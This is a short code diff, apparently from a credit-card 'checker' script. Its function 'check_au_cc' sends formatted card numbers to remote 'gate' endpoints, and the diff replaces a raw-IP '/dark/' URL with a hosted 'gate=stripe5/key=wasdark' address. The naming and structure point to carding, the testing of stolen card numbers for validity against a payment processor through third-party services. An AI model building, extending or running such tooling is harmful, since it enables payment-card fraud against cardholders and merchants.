@@ -1302,7 +1302,7 @@ def check_au_cc(cc):
 
         try:
             # API request to AU endpoint
-            response = requests.get(f"http://147.93.105.138:5126/dark/{formatted_cc}", timeout=120)
+            response = requests.get(f"https://au-api-storm.onrender.com/gate=stripe5/key=wasdark/cc={formatted_cc}", timeout=120)
             if response.status_code == 200:
                 try:
                     data = response.json()
